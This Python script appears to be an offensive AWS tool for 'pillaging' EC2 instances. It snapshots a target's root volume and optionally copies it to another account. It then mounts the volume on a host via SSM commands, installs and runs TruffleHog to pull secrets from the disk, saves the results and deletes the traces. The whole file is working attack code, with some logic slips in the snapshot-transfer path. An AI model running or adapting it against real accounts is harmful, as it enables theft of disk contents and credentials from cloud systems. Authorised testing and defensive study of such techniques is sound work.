import boto3
import os
import subprocess
import logging
import argparse
import string
import time
from botocore.exceptions import ClientError  
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def list_ebs_volumes(ec2_resource):
    """List all available EBS volumes and snapshots."""
    try:
        volumes = [volume for volume in ec2_resource.volumes.all() if volume.state == 'available']
        snapshots = list(ec2_resource.snapshots.filter(OwnerIds=['self']))

        volume_details = []
        for volume in volumes:
            volume_info = {
                'VolumeId': volume.id,
                'State': volume.state,
                'Size': volume.size,
                'SnapshotId': volume.snapshot_id
            }
            volume_details.append(volume_info)
            logging.info(f"EBS Volume ID: {volume.id}, State: {volume.state}, Size: {volume.size} GiB, Snapshot ID: {volume.snapshot_id}")

        snapshot_details = []
        for snapshot in snapshots:
            snapshot_info = {
                'SnapshotId': snapshot.id,
                'VolumeId': snapshot.volume_id,
                'State': snapshot.state,
                'StartTime': snapshot.start_time
            }
            snapshot_details.append(snapshot_info)
            logging.info(f"Snapshot ID: {snapshot.id}, Volume ID: {snapshot.volume_id}, State: {snapshot.state}, Start Time: {snapshot.start_time}")

        return volume_details, snapshot_details
    except Exception as e:
        logging.error(f"Failed to list EBS volumes and snapshots: {str(e)}")
        return [], []

def list_ec2_instances(src_profile, src_region):
    """List all EC2 instances along with their IP addresses."""
    try:
        session = boto3.Session(profile_name=src_profile, region_name=src_region)
        ec2_resource = session.resource('ec2')
        instances = list(ec2_resource.instances.all())
        
        instance_details = []
        for instance in instances:
            instance_info = {
                'InstanceId': instance.id,
                'State': instance.state['Name'],
                'PublicIpAddress': instance.public_ip_address,
                'PrivateIpAddress': instance.private_ip_address
            }
            instance_details.append(instance_info)
            #logging.info(f"Instance ID: {instance.id}, State: {instance.state['Name']}, Public IP: {instance.public_ip_address}, Private IP: {instance.private_ip_address}")
        
        return instance_details
    except Exception as e:
        logging.error(f"Failed to list EC2 instances: {str(e)}")
        return []
    
def create_snapshot(ec2_client, instance_id, profile_name, region_name):
    """Create a snapshot of the root volume of the specified EC2 instance."""
    logging.info(f"Creating snapshot for instance {instance_id} using client in region {region_name} and profile {profile_name}")
    try:
        # Use the provided session for the specified profile and region
        session = boto3.Session(profile_name=profile_name, region_name=region_name)
        ec2_client = session.client('ec2')

        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        availability_zone = instances[0]['Placement']['AvailabilityZone']

        root_device = instances[0].get('RootDeviceName')
        if not root_device:
            raise ValueError(f"No root device found for instance {instance_id}")
        
        volumes = instances[0].get('BlockDeviceMappings', [])
        src_volume_id = next((v['Ebs']['VolumeId'] for v in volumes if v['DeviceName'] == root_device), None)
        if not src_volume_id:
            raise ValueError(f"No volume ID found for instance {instance_id}")

        snapshot = ec2_client.create_snapshot(
            VolumeId=src_volume_id,
            Description='Snapshot for pillaging',
            TagSpecifications=[{
                'ResourceType': 'snapshot',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )
        ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
        
        logging.info(f"Snapshot {snapshot['SnapshotId']} created successfully.")
        return snapshot['SnapshotId']

    except Exception as e:
        logging.error(f"Failed to create snapshot for instance {instance_id}: {str(e)}")
        return None

def transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id):
    """Transfer EBS snapshot from source account to destination account."""
    def json_serialize(obj):
        """JSON serializer for objects not serializable by default json code"""
        if isinstance(obj, datetime):
            return obj.isoformat()
        raise TypeError("Type not serializable")

    try:
        src_session = boto3.Session(profile_name=src_profile, region_name=src_region)
        dst_session = boto3.Session(profile_name=dst_profile, region_name=dst_region)

        src_account_id = src_session.client('sts').get_caller_identity()['Account']
        dst_account_id = dst_session.client('sts').get_caller_identity()['Account']

        if src_account_id == dst_account_id:
            logging.info("Source and destination accounts are the same. Skipping snapshot transfer.")
            return snapshot_id

        ec2_src = src_session.client('ec2')
        ec2_dst = dst_session.client('ec2')

        response = ec2_src.describe_snapshots(SnapshotIds=[snapshot_id])
        source_snapshot = response['Snapshots'][0]

        # Log the source_snapshot details with custom JSON serialization for datetime objects
        logging.info(f"Source snapshot details: {json.dumps(source_snapshot, default=json_serialize, indent=4)}")

        # Extract the region from the source snapshot
        source_region = src_region  # Use the provided src_region directly

        # Log the command being run
        logging.info(f"Running command: ec2_dst.copy_snapshot("
                     f"SourceSnapshotId={snapshot_id}, "
                     f"SourceRegion={source_region}, "
                     f"DestinationRegion={dst_region}, "
                     f"DestinationAccountId={dst_account_id})")

        copied_snapshot = ec2_dst.copy_snapshot(
            SourceSnapshotId=snapshot_id,
            SourceRegion=source_region,
            DestinationRegion=dst_region,
            TagSpecifications=[{
                'ResourceType': 'snapshot',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )

        logging.info(f"Snapshot {copied_snapshot['SnapshotId']} transferred from {src_profile} to {dst_profile}.")
        return copied_snapshot['SnapshotId']  # Return the new snapshot ID

    except Exception as e:
        logging.error(f"Snapshot transfer failed: {str(e)}")
        return None


def find_available_device(ec2_client, instance_id):
    """Find an available device name on the EC2 instance."""
    try:
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        root_device = instance['Reservations'][0]['Instances'][0]['RootDeviceName']
        attached_devices = [v['DeviceName'] for v in instance['Reservations'][0]['Instances'][0]['BlockDeviceMappings']]
        
        # Exclude root device from available devices and establish dictionary of devices aws cli sees (diff from what ec2 sees)
        available_devices = ['/dev/sdf', '/dev/sdg', '/dev/sdh', '/dev/sdi', '/dev/sdj', '/dev/sdk', '/dev/sdl', '/dev/sdm', '/dev/sdn', '/dev/sdo', '/dev/sdp', '/dev/sdq', '/dev/sdr', '/dev/sds', '/dev/sdt', '/dev/sdu', '/dev/sdv', '/dev/sdw', '/dev/sdx', '/dev/sdy', '/dev/sdz']
        available_devices = [dev for dev in available_devices if dev not in attached_devices and dev != root_device]

        # Choose the first available device name
        if available_devices:
            return available_devices[0]
        else:
            return None
    except Exception as e:
        logging.error(f"Failed to find available device: {str(e)}")
        return None

def create_volume(ec2_client, snapshot_id, instance_id, is_src_profile=True):
    """Create a new EBS volume from the specified snapshot in the availability zone of the EC2 instance."""
    logging.info(f"Creating volume from snapshot {snapshot_id} in the {'source' if is_src_profile else 'destination'} account...")
    try:
        # Fetch the availability zone of the EC2 instance
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        availability_zone = instances[0]['Placement']['AvailabilityZone']

        # Create the volume using the correct availability zone
        volume = ec2_client.create_volume(
            SnapshotId=snapshot_id,
            AvailabilityZone=availability_zone,
            TagSpecifications=[{
                'ResourceType': 'volume',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )
        dst_volume_id = volume['VolumeId']  # Updated to capture the correct volume ID

        # Wait for the volume to become available
        attempts = 0
        while True:
            volume_status = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])['Volumes'][0]['State']
            if volume_status == 'available':
                logging.info(f"Volume {dst_volume_id} is now available.")
                break
            elif attempts >= 30:
                raise TimeoutError("Max attempts exceeded while waiting for volume to be available.")
            else:
                attempts += 1
                time.sleep(10)  # Wait for 10 seconds before checking again

        logging.info(f"Volume {dst_volume_id} created successfully from snapshot {snapshot_id}.")
        return dst_volume_id

    except Exception as e:
        logging.error(f"Failed to create volume from snapshot: {str(e)}")
        return None


def delete_snapshot_and_volume(ec2_client, src_snapshot_id, dst_snapshot_id, dst_volume_id, retain=False):
    """Delete the specified snapshots and EBS volume."""
    time.sleep(10)  # Delay before deletion

    try:
        # Check volume state and attachments for the destination volume
        volume_info = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])
        attachments = volume_info['Volumes'][0]['Attachments']
        
        if attachments:
            # Volume is attached, force detach it
            ec2_client.detach_volume(VolumeId=dst_volume_id, Force=True)
            logging.info(f"Volume {dst_volume_id} forcefully detached.")

        # Delete the destination volume
        ec2_client.delete_volume(VolumeId=dst_volume_id)
        logging.info(f"Deleted volume {dst_volume_id} in --dst-profile account.")

        if not retain:
            # Delete the source and destination snapshots
            ec2_client.delete_snapshot(SnapshotId=src_snapshot_id)
            logging.info(f"Deleted snapshot {src_snapshot_id} in --src-profile account.")
            
            ec2_client.delete_snapshot(SnapshotId=dst_snapshot_id)
            logging.info(f"Deleted snapshot {dst_snapshot_id} in --dst-profile account.")
        else:
            logging.info(f"Retaining snapshots {src_snapshot_id} and {dst_snapshot_id}.")
    except Exception as e:
        logging.error(f"Failed to delete volume or snapshots: {str(e)}")

def find_attached_volumes(instance_id, ssm_client):
    """Find attached NVMe volumes for the specified EC2 instance using SSM."""
    # Run lsblk command on the instance using SSM
    response = ssm_client.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Parameters={'commands': ['lsblk --json']}
    )

    # Get the command execution ID to retrieve the output
    command_id = response['Command']['CommandId']

    # Wait for the command to complete and get the output
    output = ''
    while True:
        time.sleep(5)  # Adjust the sleep duration as needed
        command_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )
        if command_output['Status'] in ['Success', 'Failed']:
            output = command_output['StandardOutputContent']
            break

    # Parse the JSON output of lsblk to get the attached NVMe volumes
    attached_nvme_volumes = []
    if output:
        lsblk_output = json.loads(output)
        for disk in lsblk_output['blockdevices']:
            if disk['name'].startswith('nvme') and disk.get('children'):
                for partition in disk['children']:
                    if partition['name'].startswith('nvme'):
                        attached_nvme_volumes.append(partition['name'])

    return attached_nvme_volumes
    
def mount_ebs_volume(instance_id, volume_id, ssh_key_path, mount_path, profile_name, region):
    """Mount the Linux partition of an EBS volume to a specified instance with SSM."""
    try:

        # Create an AWS session using the specified profile and region
        session = boto3.Session(profile_name=profile_name, region_name=region)

        # Create the SSM client using the session
        ssm_client = session.client('ssm')

        # Create the mount path using SSM
        create_mount_path_command = f"sudo mkdir -p {mount_path}"
        # print(f"Creating mount path command: {create_mount_path_command}")
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [create_mount_path_command]}
        )

        # Wait for the command to complete
        command_id = response['Command']['CommandId']
        # print(f"Waiting for command with ID {command_id} to complete...")

        # Add debug print statements here
        # print(f"Command ID: {command_id}")
        # print(f"Instance ID: {instance_id}")
        # print(f"Plugin Name: 'aws:runShellScript'")

        # print(f"Command with ID {command_id} completed.")

        # Find attached volumes using SSM
        # print(f"we are hereeeeeeee")
        attached_volumes = find_attached_volumes(instance_id, ssm_client)

        # Filter attached volumes to get only NVMe devices
        nvme_volumes = [volume for volume in attached_volumes if volume.startswith('nvme')]
        # print(f"NVMe volumes found: {nvme_volumes}")

        # Sort the NVMe volumes based on the numeric part of the device name
        nvme_volumes_sorted = sorted(nvme_volumes, key=lambda x: int(re.search(r'\d+', x).group()))
        # print(f"Sorted NVMe volumes: {nvme_volumes_sorted}")

        # Choose the first partition of the last attached NVMe volume for mounting
        if nvme_volumes_sorted:
            latest_device_name = nvme_volumes_sorted[-1]

            # Extract the drive number from the device name
            drive_number = re.search(r'nvme(\d+)', latest_device_name).group(1)

            # Recreate the device name with the first partition
            recreated_device_name = f"nvme{drive_number}n1p1"

            # print(f"Latest NVMe device name: {latest_device_name}")
            # print(f"Recreated device name for mounting: {recreated_device_name}")
        else:
            logging.error("No attached NVMe volumes found.")
            return None

        # Run the mount command using SSM for the first partition
        mount_command = f"sudo mount /dev/{recreated_device_name} {mount_path}"
        # print(f"Mounting command: {mount_command}")
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [mount_command]}
        )

        # Wait for the command to complete
        command_id = response['Command']['CommandId']
        # print(f"Waiting for mount command with ID {command_id} to complete...")

        logging.info(f"Volume {volume_id} mounted to {mount_path} on /dev/{recreated_device_name}")
        return mount_path

    except Exception as e:
        logging.error(f"Failed to attach and mount volume {volume_id} to {instance_id}: {str(e)}")
        return None

def install_trufflehog_ssm(instance_id, ssm_client):
    try:
        # SSM command to install Trufflehog
        install_command = """
            sudo apt update && sudo apt install -y wget && \
            wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && \
            tar xzf /tmp/trufflehog.tar.gz -C /tmp/ && \
            chmod +x /tmp/trufflehog && \
            ls -lah /tmp/trufflehog
        """

        # Send the install command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [install_command]}
        )

        # Get the command execution ID to track installation progress if needed
        command_id = response['Command']['CommandId']
        # logging.info(f"Trufflehog installation command ID: {command_id}")

        # Stream the command output if necessary
        # stream_command_output(ssm_client, command_id, instance_id)
        # You may want to stream the output to monitor the installation progress

        return command_id

    except Exception as e:
        logging.error(f"Trufflehog installation over SSM failed: {str(e)}")
        return None

def run_trufflehog_ssm(instance_id, mount_point, pillage_path, ssh_key_path, ssm_client, json_output=False):
    try:
        # Install Trufflehog first
        install_command_id = install_trufflehog_ssm(instance_id, ssm_client)
        if not install_command_id:
            logging.error("Failed to initiate Trufflehog installation.")
            return None

        # SSM command to run Trufflehog and redirect output to a file
        output_file = '/tmp/trufflehog.out'
        ssm_command = f"/tmp/trufflehog filesystem {'--json' if json_output else ''} --no-verification --concurrency=5 {os.path.join(mount_point, pillage_path.lstrip('/'))} > {output_file}"

        # Send the run command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [ssm_command]}
        )

        # Get the command execution ID to retrieve the output
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the Trufflehog output directly from the EC2 instance
        status = stream_command_output(ssm_client, command_id, instance_id)

        if status == 'Success':
            # Read the Trufflehog output directly from the EC2 instance
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'StandardOutputContent' in command_output:
                trufflehog_output = command_output['StandardOutputContent']
                print(trufflehog_output)  # Print the Trufflehog output to stdout

            logging.info("Trufflehog run completed over SSM.")
        elif status == 'Failed':
            logging.error("Trufflehog command execution failed.")
        else:
            logging.error(f"Trufflehog command status: {status}")

        return status  # Return the final status of Trufflehog command execution

    except Exception as e:
        logging.error(f"Trufflehog scanning over SSM failed: {str(e)}")
        return None

def stream_command_output(ssm_client, command_id, instance_id):
    try:
        time.sleep(10)  # Introduce a delay before starting to retrieve output
        while True:
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'Status' in command_output:
                status = command_output['Status']
                if status in ['Success', 'Failed', 'Cancelled']:
                    break

            if 'StandardErrorContent' in command_output:
                logging.error(f"SSM stderr: {command_output['StandardErrorContent']}")

            time.sleep(5)

        # After the command completes, retrieve the final output
        final_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if 'StandardOutputContent' in final_output:
            # Save final stdout to a file
            with open('/tmp/trufflehog.out', 'w') as file:
                file.write(final_output['StandardOutputContent'])
            # Check if trufflehog.out is not empty and print its content
            file_path = '/tmp/trufflehog.out'
            """
            if os.path.getsize(file_path) > 0:
                with open(file_path, 'r') as file:
                    content = file.read()
                    if content.strip():  # Check if content is not just whitespace
                        print(f"Final SSM stdout length: {len(content)}")
                        print(f"Final SSM stdout: {content}")
                    else:
                        logging.error("trufflehog.out content is empty or contains only whitespace.")
            else:
                logging.error("trufflehog.out is empty.")
            """

        if 'StandardErrorContent' in final_output:
            logging.error(f"Final SSM stderr: {final_output['StandardErrorContent']}")

        return status

    except Exception as e:
        logging.error(f"Error streaming command output: {str(e)}")
        return None
    
def save_trufflehog_output(instance_id, ssm_client, out_file):
    """Save Trufflehog output to a local file."""
    try:
        # Retrieve Trufflehog output file from the instance
        get_command = f"sudo cat /tmp/trufflehog.out"
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [get_command]}
        )

        # Get the command execution ID to track file retrieval
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the output file
        while True:
            time.sleep(5)  # Adjust the sleep duration as needed
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )
            if command_output['Status'] in ['Success', 'Failed']:
                break

        # Save the output to the specified local file
        with open(out_file, 'w') as file:
            file.write(command_output['StandardOutputContent'])

        logging.info(f"Trufflehog output saved to {out_file}")

    except Exception as e:
        logging.error(f"Failed to save Trufflehog output to file: {str(e)}")

def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, mount_host, pillage, target_ec2, pillage_path, mount_path, ssh_key_path, retain=False, json_output=False, out_file=None, transfer=False):
    """Main function to handle AWS resources."""
    
    logging.debug(f"Initializing AWS sessions:")
    logging.debug(f"Source Profile: {src_profile}, Region: {src_region}")
    logging.debug(f"Destination Profile: {dst_profile}, Region: {dst_region}")

    session_src = boto3.Session(profile_name=src_profile, region_name=src_region)
    session_dst = boto3.Session(profile_name=dst_profile, region_name=dst_region)
    ec2_client_src = session_src.client('ec2')
    ec2_client_dst = session_dst.client('ec2')
    ec2_resource_dst = session_dst.resource('ec2')
    ssm_client_dst = session_dst.client('ssm')

    if list_ebs:
        logging.debug("Listing EBS volumes in the destination account:")
        volumes, snapshots = list_ebs_volumes(ec2_resource_dst)
        for volume in volumes:
            logging.info(f'EBS Volume ID: {volume["VolumeId"]}, State: {volume["State"]}, Size: {volume["Size"]} GiB, Snapshot ID: {volume["SnapshotId"]}')
        for snapshot in snapshots:
            logging.info(f'Snapshot ID: {snapshot["SnapshotId"]}, Volume ID: {snapshot["VolumeId"]}, State: {snapshot["State"]}, Start Time: {snapshot["StartTime"]}')
        return  # Exit after listing EBS volumes and snapshots

    if list_ec2:
        logging.debug("Listing EC2 instances in the source account:")
        instances = list_ec2_instances(src_profile, src_region)
        for instance in instances:
            logging.info(f'Instance ID: {instance["InstanceId"]}, State: {instance["State"]}, Public IP: {instance["PublicIpAddress"]}, Private IP: {instance["PrivateIpAddress"]}')
        return  # Exit after listing EC2 instances

    if transfer:
        logging.debug(f"Verifying target EC2 instance {target_ec2} in the source account {src_profile}:")
        # Validate that target_ec2 is in the source account
        try:
            instance = ec2_client_src.describe_instances(InstanceIds=[target_ec2])
            reservations = instance.get('Reservations', [])
            if not reservations:
                raise ValueError(f"No reservations found for instance {target_ec2} in source account {src_profile}")
            
            logging.info(f"Target EC2 instance {target_ec2} verified in source account {src_profile}.")
        except Exception as e:
            logging.error(f"Failed to verify target EC2 instance in source account: {str(e)}")
            return

    if pillage and mount_host and target_ec2:
        logging.debug(f"Creating snapshot for target EC2 instance {target_ec2} in the source account {src_profile}:")
        snapshot_id = create_snapshot(ec2_client_src, target_ec2, src_profile, src_region)
        if snapshot_id:
            if src_profile != dst_profile and transfer:
                logging.debug(f"Transferring snapshot {snapshot_id} from {src_profile} to {dst_profile}")
                transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id)
                # Now use the destination profile to create the volume
                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
            else:
                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)

            if dst_volume_id:
                logging.info(f'Volume {dst_volume_id} created in the source account and attached to instance {target_ec2}.')

                logging.debug(f"Mounting EBS volume {dst_volume_id} on instance {mount_host} in the {'source' if src_profile == dst_profile else 'destination'} account")
                mount_point = mount_ebs_volume(mount_host, dst_volume_id, ssh_key_path, mount_path, dst_profile if src_profile != dst_profile else src_profile, dst_region if src_profile != dst_profile else src_region)
                if mount_point:
                    logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')

                    logging.debug(f"Running Trufflehog on mounted volume at {mount_point}")
                    status = run_trufflehog_ssm(mount_host, mount_point, pillage_path, ssh_key_path, ssm_client_dst, json_output=json_output)
                    if status == 'Success':
                        if out_file:
                            logging.debug(f"Saving Trufflehog output to {out_file}")
                            save_trufflehog_output(mount_host, ssm_client_dst, out_file)
                        if not retain:
                            logging.debug(f"Deleting snapshot and volume after processing")
                            delete_snapshot_and_volume(ec2_client_src, snapshot_id, snapshot_id, dst_volume_id)
                        else:
                            logging.info("Volume and snapshot retained.")
                    else:
                        logging.error("Trufflehog execution failed.")
                else:
                    logging.error("Failed to mount volume.")
            else:
                logging.error("Failed to create volume.")
        else:
            logging.error("Failed to create snapshot.")
    else:
        logging.error("Not all necessary parameters provided for pillaging.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Process EBS volumes and enumerate EC2 instances.')
    parser.add_argument('--list-ebs', action='store_true', help='List available EBS volumes.')
    parser.add_argument('--list-ec2', action='store_true', help='List EC2 instances.')

    parser.add_argument('--mount-host', help='EC2 instance ID to mount volumes on when pillaging.')
    parser.add_argument('--target-ec2', help='Target EC2 instance ID for snapshot and mounting.')
    parser.add_argument('--pillage', action='store_true', help='Enable mounting and processing of volumes on the specified instance.')
    parser.add_argument('--pillage-path', help='Path within the mounted volume to run Trufflehog.', default='')
    parser.add_argument('--mount-path', help='Path to mount the EBS volume.')
    parser.add_argument('--ssh-key-path', help='Path to the SSH key file for SSH commands.')
    parser.add_argument('--retain', action='store_true', help='Retain the volume and snapshot after processing.')
    parser.add_argument('--json', action='store_true', help='Enable JSON output format for Trufflehog.')
    parser.add_argument('--out-file', help='Path to save the Trufflehog output locally.')

    parser.add_argument("--transfer", action="store_true", help="Transfer snapshot between AWS accounts")
    parser.add_argument("--src-profile", help="Source AWS profile (required for transfer)")
    parser.add_argument("--dst-profile", help="Destination AWS profile (required for transfer)")
    parser.add_argument("--src-region", help="Source AWS region (required for transfer)")
    parser.add_argument("--dst-region", help="Destination AWS region (required for transfer)")

    args = parser.parse_args()

    main(args.src_profile, args.dst_profile, args.src_region, args.dst_region, args.list_ebs, args.list_ec2, args.mount_host, args.pillage, args.target_ec2, args.pillage_path, args.mount_path, args.ssh_key_path, args.retain, args.json, args.out_file, args.transfer)